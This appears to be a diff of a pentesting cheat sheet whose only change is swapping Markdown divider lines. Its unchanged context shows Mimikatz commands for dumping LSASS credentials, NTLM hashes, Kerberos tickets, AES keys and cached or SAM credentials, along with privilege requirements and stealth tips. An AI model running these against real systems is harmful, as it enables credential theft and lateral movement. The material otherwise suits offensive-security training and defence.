@@ -18,7 +18,7 @@ linked:
 ---
 # LSASS Dumping - Mimikatz Methods
 
-***
+---
 
 ## Pre-Requirements
 
@@ -32,7 +32,7 @@ linked:
 
 **Required priv:** `SeDebugPrivilege` (default Local Administrators). Sin esto = `ERROR mimikatz_doLocal ; "logonpasswords" command of "sekurlsa" module not found`.
 
-___
+---
 
 ## sekurlsa::logonpasswords
 
@@ -56,7 +56,7 @@ mimikatz # sekurlsa::logonpasswords > creds.txt
 :: - credman (Credential Manager)
 ```
 
-___
+---
 
 ## sekurlsa::msv (NTLM only)
 
@@ -66,7 +66,7 @@ ___
 | `mimikatz # sekurlsa::msv /username:<user>` | Single user filter | Stealth. |
 ^lsass-mimi-msv
 
-___
+---
 
 ## sekurlsa::tickets (Kerberos)
 
@@ -86,7 +86,7 @@ mimikatz # sekurlsa::tickets /export
 :: Use: mimikatz # kerberos::ptt <ticket>.kirbi
 ```
 
-___
+---
 
 ## sekurlsa::ekeys (AES Keys)
 
@@ -107,7 +107,7 @@ mimikatz # sekurlsa::ekeys
 
 **Por qué útil:** AES keys necesarias para Overpass-the-Hash modern (Rubeus `/aes256`). RC4 hash sigue siendo NTLM. AES separado.
 
-___
+---
 
 ## sekurlsa::credman (Credential Manager)
 
@@ -116,7 +116,7 @@ ___
 | `mimikatz # sekurlsa::credman` | Saved credentials (RDP, SMB, web) | Bonus creds. |
 ^lsass-mimi-credman
 
-___
+---
 
 ## sekurlsa::wdigest (Legacy Cleartext)
 
@@ -139,7 +139,7 @@ mimikatz # sekurlsa::wdigest
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
 ```
 
-___
+---
 
 ## lsadump::sam (Local SAM)
 
@@ -150,7 +150,7 @@ ___
 | `mimikatz # lsadump::cache` | Cached domain credentials (mscash) | Offline crack. |
 ^lsass-mimi-lsadump
 
-___
+---
 
 ## Process Memory Read
 
@@ -166,7 +166,7 @@ mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
 mimikatz # sekurlsa::logonpasswords full
 ```
 
-___
+---
 
 ## Common Errors
 
@@ -179,4 +179,4 @@ ___
 | Output sin entries | RunAsPPL active o Credential Guard | Modern protection. |
 ^lsass-mimi-errors
 
-***
+---
